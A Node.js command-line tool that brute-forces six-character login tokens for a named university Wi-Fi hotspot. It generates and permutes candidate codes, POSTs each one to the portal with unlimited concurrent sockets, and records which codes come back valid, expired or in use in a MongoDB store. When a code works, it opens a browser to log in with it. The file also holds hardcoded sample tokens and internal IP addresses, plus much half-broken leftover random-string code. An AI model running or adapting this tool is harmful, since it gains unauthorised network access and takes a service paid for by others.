#!/usr/bin/env node
var express = require("express");
var qs = require("querystring");
var url = require('url');
var http = require('http');
var sizeOf = require('image-size');
var cors = require("cors");
// var request = require("request");
var request = require('request-promise');
var colors = require('colors');
var open = require('open');
var restful = require('node-restful');
var mongoose = require('mongoose');

var program = require('commander');
var version = require('./package.json').version;

var app = express();

mongoose.connect("mongodb://localhost:27017/wifi_tokens", {
	useNewUrlParser: true,
	useUnifiedTopology: true
});
mongoose.connection.on("open", function(){
	console.log("Connected: Successfully connect to mongo server");
});
mongoose.connection.on('error', function(){
	console.log("Error: Could not connect to MongoDB. Did you forget to run 'mongod'?");
});

var Token = restful.model('wifi_tokens', new mongoose.Schema({
	token: {type: String, unique: true, index: true},
	status: String
}));

if (process.argv.slice(2).length > 0) {

program
	.name('dwuwifi')
	.usage('[options] <cmd>')
	.description('generates tokens for dwu-hotspot')
	// .option('-m, --mode [mode]', "which setup mode to use i.e. -m=cli or -m=gui", /^(gui|cli)$/i)
	// .action(function(env, options){
	// 	var mode = env.mode || "gui";
	// 	env = 'all';
	// 	console.log('setup for %s env(s) with %s mode', env, mode);
	// 	// allowGUI();
	// })
	.option('-c, --check <token>', 'checks the existence of the given token in the database i.e. check=123456')
	.option('-C 		 <token>', 'checks the validity of token')
	// .command('list', 'list tokens', {isDefault: true})
	.option('-l, --login', 'open browser to login if the given token is valid. defaults to `checking`')
	.option('    --token <token>', 'i.e. --token=123456', /([a-zA-Z0-9])/i)
	.option('    --limit <limit>', 'i.e. --limit=3', /\d/i)
	.option('    --status [status]', 'i.e. --status=checking', /^(checking|valid|invalid|expired|exceeded)$/i)
	.option('-r, --recursive', 'generates tokens recursively')
	.option('-s, --save', 'saves token')
	.option('-R, --request', 'check if the given token is valid, exceeded, expired or not valid e.g. request --token=123456')
	.version(version, '-v, --version')
	.on('--help', function(){
		console.log('')
		console.log('Examples:');
		console.log('	$ dwuwifi --login --token=123456 --limit=3 --status=checking');
		console.log('	$ dwuwifi -r -s');
	})
	.parse(process.argv);

// if (program.cli) {
		// console.log('recursively generate tokens\n');
		// randomize();
	if (program["recursive"]) {
		randomize();
	}
	if (program["login"]) {
		var options = {};
		if (program.token) options['token'] = program.token;
		if (program.status) options['status'] = program.status;
		if (program.limit) options['limit'] = program.limit;
		if (program.skip) options['skip'] = program.skip;
		if (program.sort) options['sort'] = program.sort;
		if (JSON.stringify(options).length > 2) s(options);
		else s();
	}
	if (program["check"]) {
		checkExistence(program.check/*TWM2N6*/);
	}
	if (program["request"]) {
		s();
	}
// }

} else {
	allowGUI();
}

function allowGUI(){
	Token.methods(['get', 'post', 'put', 'delete']);
	Token.register(app, "/tokens");

	app.listen(3000, function(req, res) {
		console.log("server running on port 3000");
		//
		// const argv = require('minimist')(process.argv.slice(2));
		// console.log(argv);
		//
		// if (argv && argv['cli']) {
		//   switch (argv._[0]) {
		//     case "randomize":
		//       program.recursive = true;
		//       if (argv.s) save = true;
		//       randomize();
		//       break;
		//     case "login":
		//       var options = {};
		//       if (argv.token) options['token'] = argv.token;
		//       if (argv.status) options['status'] = argv.status;
		//       if (argv.limit) options['limit'] = argv.limit;
		//       if (argv.skip) options['skip'] = argv.skip;
		//       if (argv.sort) options['sort'] = argv.sort;
		//       if (JSON.stringify(options).length > 2) s(options);
		//       else s();
		//       break;
		//     case "request":
		//       sendRequest(/*TWM2N6*/);
		//       break;
		//     case "check":
		//       checkExistence(/*TWM2N6*/);
		//       break;
		//     default:
		//       console.log(
		//         "Welcome 😍😊😎!!\n",
		//         "::options::\n",
		//         "randomize  -   randomly create tokens e.g. randomize --cli -s\n",
		//         "login      -   check tokens, default `checking`  e.g. login --token=123456 --limit=3 --status=checkng\n",
		//         "request    -   send request to check if the provided token is valid, exceeded, expired or not valid e.g. request --token=123456\n",
		//         "check      -   check if the token provided already exists e.g. check --token=123456\n"
		//       );
		//       process.exit(1);
		//   }
		// }
		// else {
			randomize()
		//   s();
		//   // handlingDuplicate()
		//   // checkExistence('TWM2N6')
		//   // sendRequest('RME9E1')
		//   // rapidGeneration()
		// }
	// 
	});

	// enables cors
	app.use(cors({
		'allowedHeaders': ['sessionId', 'Content-Type'],
		'exposedHeaders': ['sessionId'],
		'methods': 'GET,HEAD,PUT,PATCH,POST,DELETE',
	}));
	// 
	app.get("/", function(req, res) {
		res.sendFile(__dirname + "/randomToken.html");
	});
	// 
	app.get("/data", function(req, res) {
		var code = req.query.code;
		sendRequest(code);
	});
}

function s(options){
	var query = Token.find();
	if (options) {
		if (options.token) query.where({token: new RegExp('^'+options.token)});
		if (options.status) query.where({status: options.status});
		if (options.limit) query.limit(options.limit);
		if (options.skip) query.skip(options.skip);
		if (options.sort) query.sort(options.sort);
	} else {
		query
		// .where({token: new RegExp('^X')})
		.where({status: "checking"})
		// .limit(5000)
		// .skip(5000)
		// .sort('token')
	}
	query.lean().exec(async function(error, response) {
		if (error) console.log(error);

		console.log(response.length)

		for (var i = 0; i < response.length; i++) {
			var token = response[i].token;
			await sendRequest(token)
		}
	})
};

// queryDatabase({
//   where: "",
//   sort: ""
// }, async function(response){
//   for (var i = 0; i < response.length; i++) {
//     var token = response[i].token;
//     await sendRequest(token)
//   }
// })

function queryDatabase(query, callback) {
	Token.find(query).exec(function(error, response){
		if (error) throw new Error(error);
		return callback(response);
	});
};

function handlingDuplicate() {
	Token.find()
	.where({status: "invalid"})
	.sort('token')
	.limit(100000)
	// .skip(400000) // 400000
	.lean()
	.exec()
	.then(function(response){
		// console.log(response.length);

		response.forEach(async function(i){
			await remDup(i);
		});

		async function remDup(i){
			Token.find({"token": response[i].token}, function(err, res){
				if (res && res.length > 1) {
					console.log(res[1].token)
					res[1].remove()
					res[1].save()
				}
			});
		}
	});
};

// persistantLogin()

function persistantLogin() {
	for (var i = 0; i < 50; i++) {
		var options = { method: 'GET',
			url: 'http://hotspot.dwu.ac.pg/',
			headers: {
				'cache-control': 'no-cache',
				'content-type': 'application/x-www-form-urlencoded'
			},
			form: {
				url: 'https://www.google.com.pg',
				ip: '192.168.26.45',
				code: "8BT7LR" 
			}
		};
		console.log("Sending request with token: " + options['form']['code']);
		var r = request.defaults({pool: {maxSockets: Infinity}});
			r(options, function(error, response, body) {
				if (error) console.log(error.error)
				console.log("send: " + i)
		})
	}
}

/**
 * Randomly generating 6-character token
 */
function randomize(){
	var chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
	// var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
	// var chars = 'DSCQ3';
	// generate hundred random token
	console.log("Generating random token...")    
	for (var i=0;i < 1;i++){
		var token = '';
		for (var i = 6; i > 0; --i) token += chars[Math.floor(Math.random() * chars.length)];
		validate(token);
	};
};

async function completeToken(){
	var a = "5RNJ";
	var b = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
	// generate hundred random token
	console.log("Generating random token...")
	for(var i = 0; i < b.length; i++){
		for(var j = 0; j < b.length; j++){
			await validate(a + b[i] + b[j]);
		}
	};
}

// completeToken();

/** 
 * Validates token
 */
async function validate(token){
	var letters = 0;
	var numbers = 0;

	console.log("Validating token: " + token);

	for (var i = 0; i < token.length; i++) {
		if (isNaN(token[i])) {
			letters++;
		} else {
			numbers++;
		}
	}

	// wifi token rules 
	// 6 codes consist of capitalized letters and numbers
	// code should atleast have 
	// 4 numbers, 2 letters
	// 3 numbers, 3 letters
	// 2 numbers, 4 letters
	// 2 letters, 4 numbers
	// 3 letters, 3 numbers
	// 4 letters, 2 numbers
	// 5 letters, 1 numbers
	if (letters == 0 && numbers == 6) {program.recursive && randomize()};
	if (letters == 1 && numbers == 5) {checkExistence(token);}
	if (letters == 2 && numbers == 4) {checkExistence(token);}
	if (letters == 3 && numbers == 3) {checkExistence(token);}
	if (letters == 4 && numbers == 2) {checkExistence(token);}
	if (letters == 5 && numbers == 1) {checkExistence(token);}
	if (letters == 6 && numbers == 0) {checkExistence(token);}
};

// Check if the generated token already exists
function checkExistence(token) {
	Token.find({"token": token}).then(async function(res) {
		// if returns a match
		// randomize

		if (res && res.length) {
			console.log("Token: " + token + " already exists".red);
			
			// 
			if (program.request) await sendRequest(token);

			// 
			if (program.recursive) randomize();
			
			return;
			// otherwise sendRequest or saveToken
		} else {
			if (program.save) {
				saveToken.call(this, token, "checking");
				if (program.recursive) randomize();
				if (program.request) await sendRequest(token);
			} else {
				if (program.request) await sendRequest(token);
				if (program.recursive) randomize();
			}
		}
	});
};

// Saving token
async function saveToken(token, status, callback) {
	console.log("Saving: " + token)
	Token.find({token: token}).then(function(item) {
		if (item && item.length) {
			item[0].status = status;
			item[0].save(function(error, response){
				if (!error && response) {
					typeof callback == 'function' ? new callback() : null;
				}
			})
		} else {
			new Token({
				token: token,
				status: status
			}).save(function(error, response){
				if (!error && response) {
					typeof callback == 'function' ? new callback() : null;
				}
			})
		}
	})
	console.log("Saved: " + token)
};

// Make POST request to the server
function sendRequest(token) {
	var options = { method: 'POST',
		url: 'http://hotspot.dwu.ac.pg/',
		headers: {
			'cache-control': 'no-cache',
			'content-type': 'application/x-www-form-urlencoded' },
		form: { 
			url: 'https://www.google.com.pg',
			ip: '192.168.26.45',
			code: token 
		}
	};
	
	console.log("Sending request with token: " + token);
	
	var r = request.defaults({pool: {maxSockets: Infinity}});
	
	return new Promise(function(resolve, reject) {
		r(options, function(error, response, body) {
			if (error) reject(error.error);

			if (response && body) {
				resolve(handleRequest(body, token));
			}
		})
	})
};

// Works after checking the generated token
async function handleRequest(body, token) {
	// h(body)
	if (body.toString().search("exceeded") > -1) {
		console.log("token exceeded".blue);
		saveToken(token, "exceeded");
	}
	if ((body.toString().search("Enter the login token") > -1) && (body.toString().search("Log In") > -1)) {
		console.log("login page");
	}
	if ((body.toString().search("Log In") > -1) && !(body.toString().search("Enter the login token") > -1)) {
		console.log(("Valid token: " + token + ". Please login to connect to internet.").green);
		await saveToken(token, "valid", function(){
			console.log(("Opening browser...").green);
			open("https://hotspot.dwu.ac.pg/?code="+token, "firefox", function(response) {
				if (response == null) {
					process.exit(1)
				}
			});
		});
	}
	if (body.toString().search("expired") > -1) {
		console.log("token expired".red);
		saveToken(token, "expired");
	}
	if (body.toString().search("not valid") > -1) {
		console.log(("invalid token: " + token).red);
		saveToken(token, "invalid")
	}
	if (body.toString().search("in use") > -1) {
		console.log(("valid token: " + token).red);
		saveToken(token, "valid")
	}
};

var c = [
	['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'],
	['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'],
	['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'],
	['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'],
	['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'],
	['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'],
];

async function permutate(abc, memo) {
	var options;
	memo = memo || abc.shift().slice(0);
	
	if(abc.length) {
		options = abc.shift();

		return await permutate(abc, memo.reduce(function(all, item){
			return all.concat(options.map(function(option){
				return option + item;
			}))
		}, []))        
	}

	return memo;
};

// console.log(permutate(c));

/**
 * This script randomly generates six alphanumeric characters
 */
function generate_random_wifi_token() {
	var token = [];
	var ticket = ["5GPGMN","NG1822","HMQ6DN","5D43G8"];
	var ipaddress = ["192.168.1.237","192.168.2.38","192.168.1.222"];
	var url = "";

	var alpha = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"];
	var num = ["1","2","3","4","5","6","7","8","9","0"];
	var pool = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

	for (var i=0; i<6; i++) {
			var temp, temp1, temp2;
			token[i] = pool[Math.floor(Math.random() * pool.length)];
			if (token.contains == "2" && token.indexOf("2").length ) {}
			if (token.search()) {}
			token.toString().replace(",","");
	}

	return token;

	token = "f"+(Math.random()*(1<<81)).toString(24).replace(".","");
	// for (var i = 0; i < token.length; i++) {
		//a(token[i])
	// }

	validate(token)


	/**
	 * If you only want to allow specific characters, you could also do it like this:
	 */
	function randomString1(length, chars) {
			var result = '';
			for (var i = length; i > 0; --i) result += chars[Math.floor(Math.random() * chars.length)];
			return result;
	}
	var rString = randomString1(32, '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ');

	/**
	 * Another way to do it could be to use a special string that tells the function what types of characters to use. You could do that like this:
	 */
	function randomString2(length, chars) {
			var mask = '';
			if (chars.indexOf('a') > -1) mask += 'abcdefghijklmnopqrstuvwxyz';
			if (chars.indexOf('A') > -1) mask += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
			if (chars.indexOf('#') > -1) mask += '0123456789';
			if (chars.indexOf('!') > -1) mask += '~`!@#$%^&*()_+-={}[]:";\'<>?,./|\\';
			var result = '';
			for (var i = length; i > 0; --i) result += mask[Math.floor(Math.random() * mask.length)];
			return result;
	}

	console.log(randomString2(16, 'aA'));
	console.log(randomString2(32, '#aA'));
	console.log(randomString2(64, '#A!'));

	function rStr() {
			var s = Math.random().toString(36).slice(2);
			return s.length===16 ? s : rStr(); 
	}

	function randomString3(length) {
			return Math.round((Math.pow(36, length + 1) - Math.random() * Math.pow(36, length))).toString(36).slice(1);
	}

	var randomString4 = function (len, bits) {
			bits = bits || 36;
			var outStr = "", newStr;
			while (outStr.length < len)
			{
					newStr = Math.random().toString(bits).slice(2);
					outStr += newStr.slice(0, Math.min(newStr.length, (len - outStr.length)));
			}
			return outStr.toUpperCase();
	};
	
	randomString4(12, 16); // 12 hexadecimal characters
	randomString4(200); // 200 alphanumeric characters

	function randomNum(hi){
		return Math.floor(Math.random()*hi);
	} 
	function randomChar(){
		return String.fromCharCode(randomNum(100));
	}
	function randomString5(length){
		var str = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
		for(var i = 0; i < length; ++i){
			str += randomChar();
		}
		return str;
	}
	var RandomString = randomString5(32); //32 length string

	function randomString6(len) {
		var p = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		return [...Array(len)].reduce(a=>a+p[~~(Math.random()*p.length)],'');
	}

	var randomString7 = function(length) {
		var str = '';
		var chars ='0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz'.split('');
		var charsLen = chars.length;
		if (!length) {
			length = ~~(Math.random() * charsLen);
		}
		for (var i = 0; i < length; i++) {
			str += chars[~~(Math.random() * charsLen)];
		}
		return str;
	};

	function randString(length) {
		var l = length > 25 ? 25 : length;
		var str = Math.random().toString(36).substr(2, l);
		if(str.length >= length){
			return str;
		}
		return str.concat(this.randString(length - str.length));
	};

	function test(){
		for(var x = 0; x < 300000; x++){
			if(randString(x).length != x){
				throw new Error('invalid result for len ' + x);
			}
		}
	};

	function keyGen(keyLength) {
		var i, key = "", characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

		var charactersLength = characters.length;

		for (i = 0; i < keyLength; i++) {
				key += characters.substr(Math.floor((Math.random() * charactersLength) + 1), 1);
		}

		return key;
	};
	// keyGen(12);
};

// function ajax(token) {
//   var options = {
//     "method": "POST",
//     "hostname": "hotspot.dwu.ac.pg",
//     "port": null,
//     "path": "/",
//     "headers": {
//       "content-type": "application/x-www-form-urlencoded",
//       "cache-control": "no-cache"
//     }
//   };
	
//   var req = http.request(options, function (res) {
//     var chunks = [];
	
//     res.on("data", function (chunk) {
//       chunks.push(chunk);
//     });
	
//     res.on("end", function () {
//       var body = Buffer.concat(chunks);
//       console.log(body.toString());
//     });
//   });
	
//   req.write(qs.stringify({ 
//     url: 'https://www.google.com.pg',
//     ip: '192.168.2.247',
//     code: 'Y3140M' }));
//   req.end();
// };

// var imgUrl = "http://hotspot.dwu.ac.pg/?code=132EDG";
// var options = url.parse(imgUrl);
// http.get(options, function(response) {
//   var chunks = [];
//   response.on('data', function(chunk) {
//     chunks.push(chunk);
//   });
//   response.on('end', function() {
//     var buffer = Buffer.concat(chunks);
//     console.log(sizeOf(buffer))
//   });
// });

// 0|0|0|0|0|0
// 0|0|0|0|0|1
// 0|0|0|0|1|0
function rapidGeneration() {
	var chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	var length = chars.length;
	var num = [0,1,2,3,4,5,6,7,8,9];
	var arr = [0,0,0,0,0,0];
	var a = 0;
	for (var i = 0; i < length; i++) {
		arr[0] = chars[i]
		for (var j = 1; j < length; j++) {
			arr[1] = chars[j]
			for (var k = 2; k < length; k++) {
				arr[2] = chars[k];
				for (var l = 3; l < length; l++) {
					arr[3] = chars[l]
					for (var m = 4; m < length; m++) {
						arr[4] = chars[m]
						for (var n = 5; n < length; n++) {
							arr[5] = chars[n]
							if (isFinite(arr.join())) {
								a++;
								// Promise.resolve(validate(arr.join("")))
							} else if (a < 10) {
								a++;
								// Promise.resolve(validate(arr.join("")))
							} else {
								a = 1;
								// console.log(arr.join(""))
								// saveToken(arr.join(""))
								// setTimeout(function(){
								//   return Promise.resolve(validate(arr.join("")))
								// }, 3000)
							}
						}
					}
				}
			}
		}
	}
}

function cont() {
	var char = "KH7WJZ";
	for (var i = 0; i < char.length; i++) {
		var indx = char.indexOf([i]) + 1;
	}
}

function *permute(a, n = a.length) {
	if (n <= 1) yield a.slice();
	else for (let i = 0; i < n; i++) {
		yield *permute(a, n - 1);
		const j = n % 2 ? 0 : i;
		[a[n-1], a[j]] = [a[j], a[n-1]];
	}
}

// console.log(Array.from(permute("TWM2N6".split(''), 6)).map(perm => perm.join('')));
app.get("/random", async function(req, res) {
	var tokens = Array.from(permute("AXWEQA".split(''), 6)).map(perm => perm.join(''));
	res.send(tokens);
	// for (var i = 0; i < tokens.length; i++) {
	//   await sendRequest(tokens[i])
	// }
});

function heapAlgo(array, n) {
	if (array.length === 1) {
		console.log(array)
	}
	else {
		for (var i = 0; i < array.length; i++) {
			heapAlgo(array, n);
			if (array.length % 2 == 1) {
				var temp = array[0];
				array[0] = array[array.length-1];
				array[array.length-1] = temp;
			} else {
				var temp = array[i];
				array[i] = array[array.length-1];
				array[array.length-1] = temp;
			}
		}
	}
}

// heapAlgo(['a','b','c','d'], 2);
